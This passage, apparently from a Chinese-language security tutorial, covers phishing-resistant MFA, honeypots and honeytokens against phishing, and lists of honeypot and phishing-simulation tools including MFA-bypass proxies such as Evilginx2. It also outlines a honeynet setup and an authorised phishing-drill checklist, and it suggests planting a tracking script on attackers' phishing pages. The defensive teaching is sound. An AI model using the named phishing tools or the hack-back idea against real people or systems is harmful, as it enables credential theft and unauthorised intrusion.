传统 MFA（TOTP/Push Notification）可以被 Evilginx 等中间人钓鱼工具绕过，需要增强 MFA：

```bash
# === FIDO2/WebAuthn (抗钓鱼MFA) ===
# 使用硬件安全密钥(YubiKey)或平台生物识别
# FIDO2的关键特性: 绑定域名
# Evilginx的代理域名与真实域名不同
# FIDO2验证时会检查origin → 拒绝在伪造域名上认证

# === 基于风险的自适应MFA ===
# 检测: 新设备、新地点、异常时间
# 对这些高风险登录强制额外验证

# === 会话绑定 ===
# 将会话Token与客户端IP/User-Agent/TLS指纹绑定
# 增加会话劫持的难度
```

---

## 8. 蜜罐与钓鱼的交叉应用

### 8.1 用蜜罐防御钓鱼

```bash
# === 1. 邮箱蜜罐 → 钓鱼预警 ===
# 在网络中散布虚���邮箱地址
# 这些邮箱收到任何外部邮件 → 触发告警
# 说明邮件列表已被攻击者收集

# === 2. 虚假员工资料 → 钓鱼溯源 ===
# 在LinkedIn创建虚假员工账号
# 收到异常连接请求/私信 → 检测到社交工程攻击的侦察阶段

# === 3. 假凭证/假Cookie → 检测凭据泄露 ===
# 在真实系统中分布蜜标凭据
# 攻击者获取后在别处使用 → 检测到内部凭据泄露

# === 4. 蜜罐钓鱼页面 → 收集攻击者工具链 ===
# 部署伪造的"受害公司"登录页面
# 记录所有提交的凭据和IP
# 分析攻击者的行为模式
```

### 8.2 用钓鱼对抗攻击者

```bash
# === 蜜罐反制钓鱼攻击者 ===
# 1. 故意提交假数据到钓鱼页面
#    大量填充虚假凭据 → 增加攻击者筛选成本

# 2. 在假数据中嵌入蜜标
#    用户名: canary_tracker_001
#    密码: 指向蜜罐服务器的URL
#    如果攻击者尝试使用 → 溯源

# 3. 钓鱼页面反制
#    在钓鱼页面上传"backdoor" → 实际是反向追踪脚本
#    收集攻击者的浏览器指纹、IP、时区
```

---

## 9. 开源蜜罐与钓鱼工具汇总

### 9.1 蜜罐工具

| 工具             | 类型       | 用途                               |
| ---------------- | ---------- | ---------------------------------- |
| **Cowrie**       | SSH/Telnet | 模拟 Shell 环境,收集攻击者命令     |
| **Dionaea**      | 多协议     | SMB/HTTP/FTP/MSSQL/MySQL/ SIP 蜜罐 |
| **Conpot**       | ICS/SCADA  | 工控协议蜜罐                       |
| **Glastopf**     | Web        | 模拟 PHP 应用,捕获 Web 攻击        |
| **Snare/Tanner** | Web        | 现代 Web 蜜罐,克隆目标页面         |
| **Elasticpot**   | 数据库     | Elasticsearch 蜜罐                 |
| **Heralding**    | 凭证收集   | 多协议凭证捕获                     |
| **Mailoney**     | SMTP       | 邮件蜜罐                           |
| **RDPY**         | RDP        | 远程桌面蜜罐                       |
| **Endlessh**     | SSH        | 缓慢 SSH,消耗攻击者时间            |
| **Honeytrap**    | 高级交互   | 动态蜜罐,自动适应攻击              |
| **T-Pot**        | 平台       | 一键部署 20+蜜罐的蜜网             |
| **Canarytokens** | 蜜标       | 各类蜜标(文件/URL/DNS/AWS Key)     |

### 9.2 钓鱼测试工具

| 工具                              | 用途                |
| --------------------------------- | ------------------- |
| **Gophish**                       | 全功能钓鱼模拟平台  |
| **Evilginx2**                     | MFA 绕过中间人钓鱼  |
| **Modlishka**                     | 反向代理钓鱼框架    |
| **SET (Social-Engineer Toolkit)** | 钓鱼攻击工具集      |
| **King Phisher**                  | 钓鱼测试管理        |
| **FiercePhish**                   | 企业级钓鱼模拟      |
| **Muraena**                       | 反向代理 Phishing   |
| **dnstwist**                      | 相似域名发现        |
| **URLCrazy**                      | 域名错别字分析      |
| **PhishTank**                     | 钓鱼 URL 社区数据库 |

---

## 10. 实战演练

### 10.1 四步搭建简易蜜网

```bash
# 第一天: 在云主机(Ubuntu 20.04)使用T-Pot部署蜜网
# 第二步: 配置蜜标
#   在ES蜜罐中写入假AWS密钥
#   在WordPress蜜罐中嵌入Canary Token
# 第三步: 配置告警
#   设置ELK Stack收集所有蜜罐日志
#   配置Slack/钉钉/微信告警通道
# 第四步: 观察和分析
#   每天查看攻击统计
#   分析新出现的攻击手法
#   提取IOC加入生产环境防护

# 预期效果:
# - 部署后几小时内就会开始收到扫描
# - SSH蜜罐: 大量物联网设备爆破（admin/admin123/root/toor）
# - Web蜜罐: 漏洞扫描器自动化扫描（路径遍历/SQL注入）
# - 1周内可能会捕获到真实攻击工具
```

### 10.2 钓鱼演练实施清单

    钓鱼演练实施checklist:

    □ 1. 获得管理层授权
    □ 2. 确定测试范围和目标用户群
    □ 3. 选择场景（密码重置/文件共享/CEO欺诈/IT通知）
    □ 4. 配置Gophish（SMTP/Landing Page/模板）
    □ 5. 配置域名和SSL证书
    □ 6. 导入目标邮箱列表
    □ 7. 设置白名单（排除高管/IT安全团队）
    □ 8. 预测试（确认邮件能到达、链接可访问）
    □ 9. 发起演练
    □ 10. 48小时后关闭（防止长期压力）
    □ 11. 统计结果（送达率/打开率/点击率/提交率）
    □ 12. 撰写报告（不点名批评，只统计趋势）
    □ 13. 针对性安全意识培训
    □ 14. 3-6个月后复测，对比改善趋势

---

> **蜜罐法则**: 攻击者的一举一动都在为你提供免费威胁情报，学会利用这些情报来加固真实防线。

> **钓鱼法则**: 人是最薄弱的环节，也是最强大的防线——技术可以拦截 99%的钓鱼，但 1%的成功就足以攻破整个网络。安全意识培训不是在和员工较劲，而是在缩短那 1%的窗口。
